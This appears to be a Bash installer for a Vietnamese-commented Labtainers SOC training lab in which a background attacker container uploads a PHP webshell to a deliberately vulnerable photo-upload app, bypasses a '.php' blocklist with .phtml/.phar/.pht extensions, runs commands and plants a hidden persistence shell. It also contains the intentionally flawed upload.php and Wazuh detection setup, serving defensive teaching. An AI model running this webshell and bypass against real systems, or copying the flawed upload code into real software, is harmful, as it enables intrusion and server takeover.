#!/bin/bash
# ============================================================================
# Tu dong tao lab soc-webshell (Hybrid: Web Shell Upload -> RCE) tren VM Labtainers.
# Chay tren VM:  bash install-soc-webshell.sh
# Sau do:        bash apply-shared-siem.sh soc-webshell   (dung chung anh Wazuh)
#                cd $LABTAINER_DIR/scripts/labtainer-student && rebuild soc-webshell
# ============================================================================
set -e
if [ -z "$LABTAINER_DIR" ]; then echo "LOI: chua co bien LABTAINER_DIR (hay mo terminal Labtainers)"; exit 1; fi
LAB=$LABTAINER_DIR/labs/soc-webshell
echo ">> Tao thu muc lab tai $LAB"
rm -rf "$LAB"
mkdir -p "$LAB"
mkdir -p "$LAB/attacker/_bin"
cat > "$LAB/attacker/_bin/fixlocal.sh" <<'__EOF_WS_9x2k__'
#!/bin/bash
# Chay LAN DAU tren container attacker (an). Khoi dong vong lap tan cong ngam,
# tach khoi tien trinh khoi tao (setsid + &) de chay lien tuc.
setsid bash /home/ubuntu/attack.sh >/home/ubuntu/attack.log 2>&1 < /dev/null &
exit 0
__EOF_WS_9x2k__
mkdir -p "$LAB/attacker"
cat > "$LAB/attacker/attack.sh" <<'__EOF_WS_9x2k__'
#!/bin/bash
# =============================================================================
# Attacker TU DONG - tan cong UPLOAD WEBSHELL -> RCE vao he A (172.20.0.10).
# Kill-chain THUC TE: moi vong chay LAI tu dau (recon -> dis -> probe -> bypass
# -> verify -> exploit -> persistence). KHONG hardcode: tu parse form, tu thu
# cac bien the duoi file, chi giu cai server CHAP NHAN va THUC THI duoc.
# -> Khi SV va dung (allowlist / tat PHP o uploads) thi moi upload .phtml bi tu
#    choi hoac khong thuc thi => attacker TU FAIL (khong can if-patched).
# =============================================================================
T="http://172.20.0.10"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
log(){ echo "[$(date +%H:%M:%S)] $*"; }

# Payload webshell: chay lenh qua tham so ?cmd=
SHELL_SRC='<?php if(isset($_REQUEST["cmd"])){echo "<pre>";system($_REQUEST["cmd"]);echo "</pre>";} ?>'

wait_up(){
  for i in $(seq 1 120); do
    curl -s -m 4 -o /dev/null "$T/" 2>/dev/null && return 0
    sleep 3
  done
  return 1
}

# Parse trang chu de tim action + ten field file (fallback upload.php / avatar)
discover(){
  local page action field
  page=$(curl -s -m 6 -A "$UA" "$T/" 2>/dev/null)
  action=$(printf '%s' "$page" | grep -oiE "action=[\"']?[a-z0-9_./-]+" | head -1 | sed -E "s/action=[\"']?//I")
  field=$(printf '%s' "$page" | grep -oiE "type=[\"']?file[\"']?[^>]*name=[\"']?[a-z0-9_]+|name=[\"']?[a-z0-9_]+[\"']?[^>]*type=[\"']?file" \
          | grep -oiE "name=[\"']?[a-z0-9_]+" | head -1 | sed -E "s/name=[\"']?//I")
  [ -z "$action" ] && action="upload.php"
  [ -z "$field" ]  && field="avatar"
  ACTION="$action"; FIELD="$field"
}

# up <fname> <ctype> <localfile> -> in body phan hoi
up(){ curl -s -m 8 -A "$UA" -F "${FIELD}=@${3};type=${2};filename=${1}" "$T/$ACTION" 2>/dev/null; }

# Lay duong dan uploads/<...> tu phan hoi (neu app in ra), else doan theo ten
saved_path(){ printf '%s' "$1" | grep -oE "uploads/[A-Za-z0-9_.-]+" | head -1; }

# Kiem RCE: goi file, truyen marker, xem co chay khong
verify_rce(){ # $1 = path uploads/xxx ; $2 = marker
  curl -s -m 8 -A "$UA" "$T/$1?cmd=echo%20$2" 2>/dev/null | grep -q "$2"
}

attack_once(){
  discover
  log "recon: action=$ACTION field=$FIELD"

  # --- baseline: upload file "anh" hop le de biet noi luu ---
  echo "hello" > /tmp/t.jpg
  R=$(up "avatar.jpg" "image/jpeg" /tmp/t.jpg)
  BP=$(saved_path "$R"); log "baseline jpg -> ${BP:-?}"

  # --- thu .php thang (du bi chan) ---
  printf '%s' "$SHELL_SRC" > /tmp/s.php
  R=$(up "shell.php" "image/jpeg" /tmp/s.php)
  if printf '%s' "$R" | grep -qiE "BLOCK_PHP|tu choi|403"; then log "shell.php -> BI CHAN (nhu mong doi)"; fi

  # --- thu double-ext .php.jpg (thuong upload OK nhung KHONG thuc thi -> loai) ---
  R=$(up "shell.php.jpg" "image/jpeg" /tmp/s.php)
  P=$(saved_path "$R")
  if [ -n "$P" ] && verify_rce "$P" "DXMARK$$"; then
    log "double-ext RCE (hiem)"; RCE_PATH="$P"; return 0
  fi

  # --- bypass chinh: .phtml (va vai bien the) -> upload + verify RCE ---
  local n; n="av_$(date +%s)_$RANDOM"
  for ext in phtml phar pht; do
    R=$(up "${n}.${ext}" "image/jpeg" /tmp/s.php)
    P=$(saved_path "$R")
    [ -z "$P" ] && P="uploads/${n}.${ext}"   # doan neu app khong in path
    if verify_rce "$P" "RCE${RANDOM}OK"; then
      log "BYPASS .$ext THANH CONG -> RCE tai $P"
      RCE_PATH="$P"; return 0
    fi
  done
  log "khong upload duoc webshell thuc thi (co the he A da duoc VA)"
  return 1
}

post_exploit(){
  local M="PWNED_$RANDOM"
  log "post-exploit: $(curl -s -m 8 -A "$UA" "$T/$RCE_PATH?cmd=id;whoami;echo%20$M" 2>/dev/null | tr -d '\n' | tail -c 200)"
  # persistence: ha shell tang 2 ten AN (dotfile) bang chinh webshell (www-data ghi vao uploads)
  local b=".sys_$(date +%s).phtml"
  curl -s -m 8 -A "$UA" --data-urlencode "cmd=printf '%s' '$SHELL_SRC' > /var/www/html/uploads/$b" "$T/$RCE_PATH" >/dev/null 2>&1
  log "persistence: tha $b"
}

log "=== attacker start -> $T ==="
wait_up || { log "target khong len"; }
while true; do
  RCE_PATH=""
  if attack_once && [ -n "$RCE_PATH" ]; then
    post_exploit
  fi
  sleep 120
done
__EOF_WS_9x2k__
mkdir -p "$LAB/config"
cat > "$LAB/config/about.txt" <<'__EOF_WS_9x2k__'
SOC Lab - Web Shell Upload -> RCE (Hybrid Blue + Red) - web app "PhotoBox" (upload anh).
Blue: he A dang bi tan cong upload webshell: ke tan cong bypass blocklist ngay tho (.php bi chan)
bang duoi .phtml -> thuc thi lenh (RCE). SV dieu tra qua SIEM (FIM + access log), go webshell va
VA GOC ham upload, giu chuc nang tai anh hop le chay dung.
Red: he B la ban sao chua va, chi HTTP. SV tu khai thac: tim form upload -> .php bi chan -> dung
.phtml upload webshell -> RCE -> doc file flag ca nhan hoa -> nop qua /submit.php tren he B.
__EOF_WS_9x2k__
mkdir -p "$LAB/config"
cat > "$LAB/config/parameter.config" <<'__EOF_WS_9x2k__'
# parameter.config - ca nhan hoa (chong chep bai)
# He B co bi mat ca nhan hoa: WEBSHELLFLAG (lay qua upload webshell .phtml -> RCE -> doc file flag).
# Grading xac minh TREN he B qua /submit.php (B khong co shell cho SV truoc khi RCE).
FLAGVAL : RAND_REPLACE : targetb:.local/bin/fixlocal.sh : FLAGVAL : 100000 : 999999
__EOF_WS_9x2k__
mkdir -p "$LAB/config"
cat > "$LAB/config/start.config" <<'__EOF_WS_9x2k__'
# start.config - Lab soc-webshell (Hybrid: Web Shell Upload -> RCE)
# attacker (C) upload webshell (bypass blocklist .php bang .phtml) -> RCE vao targeta (A) -> SV VA (Blue).
# SV dung chinh ky thuat do PWN targetb (B) qua HTTP: upload webshell -> RCE -> doc flag -> nop /submit.php (Red).

GLOBAL_SETTINGS
	LAB_MASTER_SEED soc-webshell_student_master_seed
	GRADE_CONTAINER targeta

NETWORK  SOC_NET
	MASK 172.20.0.0/24
	GATEWAY 172.20.0.101

# --- A: PhotoBox cua sinh vien (upload loi + Wazuh agent). SV phai VA ---
CONTAINER targeta
	USER ubuntu
	SOC_NET 172.20.0.10
	ADD-HOST attacker:172.20.0.5
	ADD-HOST siem:172.20.0.20
	ADD-HOST targetb:172.20.0.40
	TERMINALS 1

# --- B: PhotoBox production (lo hong y het, chua va), CHI HTTP (khong SSH). SV PWN lay flag ---
CONTAINER targetb
	USER ubuntu
	SOC_NET 172.20.0.40
	TERMINALS 0

# --- C: ke tan cong, chay ngam, upload webshell (bypass .phtml) -> RCE vao A ---
CONTAINER attacker
	USER ubuntu
	SOC_NET 172.20.0.5
	ADD-HOST targeta:172.20.0.10
	TERMINALS 0

# --- SIEM: Wazuh (indexer + server + dashboard) ---
CONTAINER siem
	USER ubuntu
	SOC_NET 172.20.0.20
	ADD-HOST targeta:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	TERMINALS 1

# --- DEFENDER: tram sinh vien - Firefox xem dashboard + curl de khai thac B ---
CONTAINER defender
	USER ubuntu
	SOC_NET 172.20.0.30
	ADD-HOST siem:172.20.0.20
	ADD-HOST targeta:172.20.0.10
	ADD-HOST targetb:172.20.0.40
	ADD-HOST attacker:172.20.0.5
	X11 YES
	TERMINALS 1
__EOF_WS_9x2k__
mkdir -p "$LAB/defender/_bin"
cat > "$LAB/defender/_bin/fixlocal.sh" <<'__EOF_WS_9x2k__'
#!/bin/bash
# Defender: tram sinh vien. Ghi san cac dia chi muc tieu (khong lo cach khai thac - xem read_first).
cat > /home/ubuntu/muc-tieu.txt <<'TXT'
=== DIA CHI ===
Dashboard SIEM (Wazuh):   https://172.20.0.20
He A (VA tai day):        ssh analyst@172.20.0.10   (mat khau: analyst) ; ma nguon /var/www/html
He B (KHAI THAC lay flag): http://172.20.0.40        (chi HTTP)
Nop flag he B:            http://172.20.0.40/submit.php?flag=FLAG-xxxxxx
TXT
chmod 644 /home/ubuntu/muc-tieu.txt 2>/dev/null || true

# X11/Firefox: KHONG dung vao /tmp/.X11-unix. Labtainers tu lo (mkdir thu muc that + symlink X0 ben trong).
# Neu bien /tmp/.X11-unix thanh symlink ca thu muc -> lenh 'ln -fs .../X0 /tmp/.X11-unix/X0' cua Labtainers
# thay 2 ve la CUNG 1 FILE -> loi "are the same file" -> doX11Link fail -> tear down lab. Giong soc-ssh-defense.

exit 0
__EOF_WS_9x2k__
mkdir -p "$LAB/defender/_bin"
cat > "$LAB/defender/_bin/student_startup.sh" <<'__EOF_WS_9x2k__'
#!/bin/bash
# Chay trong terminal ao cua defender. Mo Wazuh dashboard trong Firefox.
# Chi chay duoi quyen user thuong (khong phai root).
if ! id | grep -q 'uid=0'; then
  ( firefox https://172.20.0.20 >/dev/null 2>&1 & )
fi
__EOF_WS_9x2k__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-webshell.attacker.student" <<'__EOF_WS_9x2k__'
#
# Labtainer Dockerfile - attacker (upload webshell -> RCE vao he A, tu dong, an)
#
ARG registry
# Base network co curl-able; them curl de tan cong HTTP thich nghi
FROM $registry/labtainer.network
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# curl: dung de recon + upload (multipart) + goi webshell
RUN apt-get update && apt-get install -y --no-install-recommends curl \
    && rm -rf /var/lib/apt/lists/* || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_WS_9x2k__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-webshell.defender.student" <<'__EOF_WS_9x2k__'
#
# Labtainer Dockerfile - defender (tram analyst, co Firefox xem dashboard Wazuh)
#
ARG registry
# firefox3 = Firefox moi (tren network3) - chay duoc dashboard Wazuh hien dai
FROM $registry/labtainer.firefox3
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7) ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# ssh-client (SSH sang targeta va) + curl + python3 (dung de khai thac he B, C2 neu can)
RUN apt-get update || true; apt-get install -y --no-install-recommends openssh-client curl python3 \
    && rm -rf /var/lib/apt/lists/*
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
# Base firefox3 co the da co san user 'ubuntu' -> chi tao neu chua co
RUN id -u $user_name >/dev/null 2>&1 || useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_WS_9x2k__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-webshell.siem.student" <<'__EOF_WS_9x2k__'
#
# Labtainer Dockerfile - siem (chay Wazuh: indexer + server + dashboard)
#
ARG registry
FROM $registry/labtainer.base2
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# Cong cu cho bake + cai offline (setcap = libcap2-bin)
RUN apt-get update && apt-get install -y --no-install-recommends curl gnupg tar libcap2-bin openssl \
    && rm -rf /var/lib/apt/lists/*
#
# Cho prestop doc alerts + agent_control khong can mat khau (de cham diem)
RUN echo 'ubuntu ALL=(ALL) NOPASSWD: /bin/cat /var/ossec/logs/alerts/alerts.log, /usr/bin/cat /var/ossec/logs/alerts/alerts.log, /var/ossec/bin/agent_control' > /etc/sudoers.d/labtainer-wazuh \
    && chmod 440 /etc/sudoers.d/labtainer-wazuh
#
# --- PRE-BAKE: tai goi Wazuh + tao chung chi luc BUILD (de first-boot cai OFFLINE) ---
RUN mkdir -p /root/wz && cd /root/wz \
 && curl -sO https://packages.wazuh.com/4.14/wazuh-install.sh \
 && bash wazuh-install.sh -dw deb -da amd64 \
 && curl -sO https://packages.wazuh.com/4.14/config.yml \
 && sed -i 's/<[a-z0-9-]*-ip>/127.0.0.1/g' config.yml \
 && bash wazuh-install.sh -g
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_WS_9x2k__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-webshell.targeta.student" <<'__EOF_WS_9x2k__'
#
# Labtainer Dockerfile - targeta (he A: PhotoBox PHP upload loi + Wazuh agent, SV va)
#
ARG registry
# Base co openssh-server (sshd) + rsyslog -> analyst SSH sang de va
FROM $registry/labtainer.network.ssh
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# Web stack: apache + php (mod-php xu ly .php VA .phtml mac dinh) + curl (cho prestop)
RUN DEBIAN_FRONTEND=noninteractive apt-get update && ( \
      apt-get install -y --no-install-recommends apache2 php libapache2-mod-php curl \
      || apt-get install -y --no-install-recommends apache2 libapache2-mod-php7.0 curl \
    ) ; rm -rf /var/lib/apt/lists/*
#
# Wazuh agent (bake, tro ve manager 172.20.0.20)
RUN apt-get update && apt-get install -y --no-install-recommends apt-transport-https ca-certificates curl gnupg && rm -rf /var/lib/apt/lists/*
RUN curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import \
    && chmod 644 /usr/share/keyrings/wazuh.gpg
RUN echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" > /etc/apt/sources.list.d/wazuh.list
RUN apt-get update && WAZUH_MANAGER="172.20.0.20" apt-get install -y wazuh-agent && rm -rf /var/lib/apt/lists/*
RUN systemctl enable wazuh-agent
RUN systemctl enable apache2 2>/dev/null || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_WS_9x2k__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-webshell.targetb.student" <<'__EOF_WS_9x2k__'
#
# Labtainer Dockerfile - targetb (he B: PhotoBox PHP upload loi, chi HTTP, SV pwn lay flag)
#
ARG registry
FROM $registry/labtainer.network
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# Web stack (khong Wazuh, khong SSH)
RUN DEBIAN_FRONTEND=noninteractive apt-get update && ( \
      apt-get install -y --no-install-recommends apache2 php libapache2-mod-php curl \
      || apt-get install -y --no-install-recommends apache2 libapache2-mod-php7.0 curl \
    ) ; rm -rf /var/lib/apt/lists/*
RUN systemctl enable apache2 2>/dev/null || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_WS_9x2k__
mkdir -p "$LAB/instr_config"
cat > "$LAB/instr_config/goals.config" <<'__EOF_WS_9x2k__'
# goals.config - Hybrid Web Shell Upload -> RCE (PhotoBox)
# Chi cham VIEC SINH VIEN LAM (bo detection/agent auto-Y). prestop chi in co/OK.

# BLUE: he A HET RCE (upload .phtml khong con thuc thi) + da go sach webshell + dich vu con chay (SLA)
blue_patched = boolean : ( _a_marker and _sla and_not _rce_open and_not _ws_left )
# BLUE: bao cao dung IOC (IP + lo hong)
reported     = boolean : ( _a_marker and _rep_ip and _rep_v )
# RED: lay FLAG he B qua upload webshell -> RCE
red_flag     = boolean : _flag

# MUC TIEU TONG: va xong (A het RCE, sach webshell, con SLA) + lay duoc flag cua B
mission_complete = boolean : ( _a_marker and _sla and_not _rce_open and_not _ws_left and _flag )
__EOF_WS_9x2k__
mkdir -p "$LAB/instr_config"
cat > "$LAB/instr_config/results.config" <<'__EOF_WS_9x2k__'
# results.config - Hybrid Web Shell Upload -> RCE (PhotoBox)
# Chi cham VIEC SINH VIEN LAM; prestop chi in co/OK; flag ca nhan hoa xac minh TREN he B.

# --- BLUE (he A) ---
_a_marker = targeta:prestop.stdout : FILE_REGEX : PRESTOP_MARKER_A
# SLA: upload anh jpg hop le van OK (app con chay dung)
_sla      = targeta:prestop.stdout : FILE_REGEX : SLA_OK
# Con RCE: upload .phtml van thuc thi duoc?
_rce_open = targeta:prestop.stdout : FILE_REGEX : A_RCE_OPEN
# Con file webshell cua ke tan cong trong uploads/?
_ws_left  = targeta:prestop.stdout : FILE_REGEX : A_WS_LEFT
# Bao cao: IP + lo hong
_rep_ip = targeta:prestop.stdout : FILE_REGEX : REP_IP_OK
_rep_v  = targeta:prestop.stdout : FILE_REGEX : REP_V_OK

# --- RED (he B) ---
_flag   = targetb:prestop.stdout : FILE_REGEX : FLAG_OK

# --- Goi y checkwork ---
#CHECK_TRUE: Dich vu A phai con tai anh hop le (SLA). Dung va qua tay lam hong upload anh that.
cw_sla = targeta:prestop.stdout : FILE_REGEX : SLA_OK
#CHECK_FALSE: Van RCE duoc - upload .phtml van thuc thi. Hay VA GOC: allowlist duoi anh + getimagesize(), HOAC tat PHP o uploads (.htaccess).
cw_rce = targeta:prestop.stdout : FILE_REGEX : A_RCE_OPEN
#CHECK_FALSE: Con file webshell trong uploads/ (ke ca file AN dang .phtml). Hay 'ls -la' va xoa het.
cw_ws = targeta:prestop.stdout : FILE_REGEX : A_WS_LEFT
#CHECK_TRUE: Chua bao cao dung IP ke tan cong + lo hong. Ghi ATTACKER_IP, VULN vao findings.txt.
cw_rep = targeta:prestop.stdout : FILE_REGEX : REP_IP_OK
#CHECK_TRUE: Chua lay duoc FLAG he B (upload .phtml -> RCE -> cat /var/lib/photobox/flag.txt -> nop /submit.php?flag=).
cw_flag = targetb:prestop.stdout : FILE_REGEX : FLAG_OK
__EOF_WS_9x2k__
mkdir -p "$LAB/siem/_bin"
cat > "$LAB/siem/_bin/fixlocal.sh" <<'__EOF_WS_9x2k__'
#!/bin/bash
# Lan khoi dong dau tren siem: tu cai Wazuh all-in-one o CHE DO NEN (~10-15 phut).
# $1 = mat khau sudo. Chi cai neu chua co (/var/ossec).
PW="$1"
if [ ! -d /var/ossec ]; then
  echo "$PW" | sudo -S nohup bash /home/ubuntu/wazuh-setup.sh >/dev/null 2>&1 &
fi
exit 0
__EOF_WS_9x2k__
mkdir -p "$LAB/siem/_bin"
cat > "$LAB/siem/_bin/prestop" <<'__EOF_WS_9x2k__'
#!/bin/bash
# prestop siem: chup bang chung Wazuh phat hien tan cong upload webshell vao he A.
# (Bang chung forensic cho GVHD doc; cham diem Blue o targeta prestop.)
trap "echo Timed out; exit" SIGTERM

echo "=== wazuh alerts (FIM them file .phtml trong uploads/, GET ?cmd=, tu 172.20.0.5) ==="
sudo -n cat /var/ossec/logs/alerts/alerts.log 2>/dev/null \
  | grep -iE "uploads|\.phtml|\.phar|\.pht|cmd=|upload\.php|172\.20\.0\.5|syscheck|added" | tail -60

echo "=== agents ==="
sudo -n /var/ossec/bin/agent_control -l 2>/dev/null
__EOF_WS_9x2k__
mkdir -p "$LAB/siem"
cat > "$LAB/siem/wazuh-setup.sh" <<'__EOF_WS_9x2k__'
#!/bin/bash
# Chay boi root o lan boot dau (goi tu fixlocal.sh). Cai Wazuh OFFLINE tu goi da bake san.
# Khong can internet. Tien do ghi vao /var/log/wazuh-install.log
cd /root/wz 2>/dev/null || cd /root
echo "[wazuh-setup] Cai Wazuh OFFLINE, bat dau luc $(date)" > /var/log/wazuh-install.log
bash wazuh-install.sh -a -o >> /var/log/wazuh-install.log 2>&1
echo "[wazuh-setup] Hoan tat luc $(date)" >> /var/log/wazuh-install.log
# Trich mat khau admin ra file de tien tra cuu
tar -O -xf /root/wz/wazuh-install-files.tar wazuh-install-files/wazuh-passwords.txt 2>/dev/null \
  | grep -A1 "'admin'" > /root/wazuh-admin-credentials.txt 2>/dev/null
__EOF_WS_9x2k__
mkdir -p "$LAB/targeta/_bin"
cat > "$LAB/targeta/_bin/fixlocal.sh" <<'__EOF_WS_9x2k__'
#!/bin/bash
# targeta (he A - PhotoBox upload), quyen 'ubuntu'. $1 = mat khau sudo.
# App THAT: upload "anh dai dien". LO HONG: blocklist ngay tho (chi chan duoi 'php',
# quen .phtml/.phar/.pht) + uploads/ thuc thi PHP -> upload .phtml = webshell = RCE.
# He A KHONG chua flag that (chi sentinel). Flag that o he B.
PW="$1"
S(){ echo "$PW" | sudo -S "$@"; }
mkdir -p /tmp/pb

cat > /tmp/pb/index.php <<'PHP'
<?php
$dir=__DIR__.'/uploads';
function h($t){ echo "<!doctype html><html><head><meta charset=utf-8><title>".$t." - PhotoBox</title><style>body{font-family:system-ui,Arial,sans-serif;max-width:720px;margin:24px auto;padding:0 16px;color:#222}h1,h2{color:#2a4d7a}a{color:#1a7f5a;text-decoration:none}button{background:#2a4d7a;color:#fff;padding:8px 16px;border:0;border-radius:4px;cursor:pointer}.card{border:1px solid #e0e0e0;border-radius:8px;padding:14px;margin:10px 0}</style></head><body>"; }
h('Trang chu');
echo "<h1>PhotoBox</h1><p>Dich vu tai len va chia se anh dai dien.</p>";
echo "<div class=card><h2>Tai anh len</h2><form method=post action=upload.php enctype=\"multipart/form-data\"><input type=file name=avatar><br><br><button>Tai len</button></form></div>";
echo "<div class=card><h2>Anh da tai</h2><ul>";
foreach(glob($dir.'/*') as $f){ $b=basename($f); echo "<li><a href=\"uploads/".rawurlencode($b)."\">".htmlspecialchars($b)."</a></li>"; }
echo "</ul></div></body></html>";
PHP

cat > /tmp/pb/upload.php <<'PHP'
<?php
$dir=__DIR__.'/uploads';
if(!is_dir($dir)){ @mkdir($dir,0775,true); }
if((isset($_SERVER['REQUEST_METHOD'])?$_SERVER['REQUEST_METHOD']:'')==='POST'
   && isset($_FILES['avatar']) && $_FILES['avatar']['error']===0){
  $name=basename($_FILES['avatar']['name']);
  // ===== LO HONG: blocklist NGAY THO - chi chan dung duoi 'php' =====
  // (quen .phtml/.phar/.pht; cung khong kiem MIME/noi dung anh)
  $parts=explode('.',$name);
  $ext=strtolower(end($parts));
  if($ext==='php'){
    http_response_code(403);
    echo "TU CHOI: khong cho tai file .php (BLOCK_PHP)";
    exit;
  }
  $dest=$dir.'/'.$name;
  if(@move_uploaded_file($_FILES['avatar']['tmp_name'],$dest)){
    echo "DA TAI LEN: <a href=\"uploads/".htmlspecialchars($name)."\">uploads/".htmlspecialchars($name)."</a> (UPLOAD_OK)";
  } else { http_response_code(500); echo "LOI khi luu file."; }
  exit;
}
header('Location: index.php');
PHP

# --- Trien khai webroot ---
S mkdir -p /var/www/html/uploads
S cp /tmp/pb/index.php /tmp/pb/upload.php /var/www/html/
S rm -f /var/www/html/index.html 2>/dev/null

# Sentinel he A (khong phai flag that)
S mkdir -p /var/lib/photobox
S bash -c 'echo "A_SENTINEL_NOT_A_FLAG" > /var/lib/photobox/secret.txt; chmod 644 /var/lib/photobox/secret.txt'

# Apache: cho .htaccess co hieu luc (de SV co the va bang .htaccess) - AllowOverride All
S bash -c 'cat > /etc/apache2/conf-available/photobox.conf <<CONF
<Directory /var/www/html>
    AllowOverride All
    Options -Indexes +FollowSymLinks
</Directory>
CONF'
S a2enconf photobox 2>/dev/null || true

# analyst so huu CODE PHP (sua upload.php khong can sudo); uploads: analyst so huu THU MUC,
# www-data (group) ghi duoc -> apache upload duoc, analyst xoa duoc webshell.
S useradd -m -s /bin/bash analyst 2>/dev/null
S bash -c 'echo "analyst:analyst" | chpasswd'
S chown -R analyst:analyst /var/www/html
S chown analyst:www-data /var/www/html/uploads
S chmod 775 /var/www/html/uploads

# Cho prestop (chay quyen ubuntu) don file test cua chinh no
S bash -c 'echo "ubuntu ALL=(ALL) NOPASSWD: /bin/rm, /usr/bin/rm" > /etc/sudoers.d/labtainer-webshell; chmod 440 /etc/sudoers.d/labtainer-webshell'

# Apache + rsyslog
S systemctl enable apache2 2>/dev/null || true
S systemctl restart apache2 2>/dev/null || S service apache2 restart 2>/dev/null || true
S service rsyslog start 2>/dev/null || S systemctl start rsyslog 2>/dev/null || true

# Wazuh agent: FIM realtime uploads/ + doc access.log apache
S bash -c "sed -i 's#</ossec_config>#<syscheck><directories realtime=\"yes\" check_all=\"yes\" report_changes=\"yes\">/var/www/html/uploads</directories></syscheck><localfile><log_format>apache</log_format><location>/var/log/apache2/access.log</location></localfile></ossec_config>#' /var/ossec/etc/ossec.conf" 2>/dev/null
S systemctl restart wazuh-agent 2>/dev/null || S service wazuh-agent restart 2>/dev/null || true

# Bao cao dieu tra (Blue)
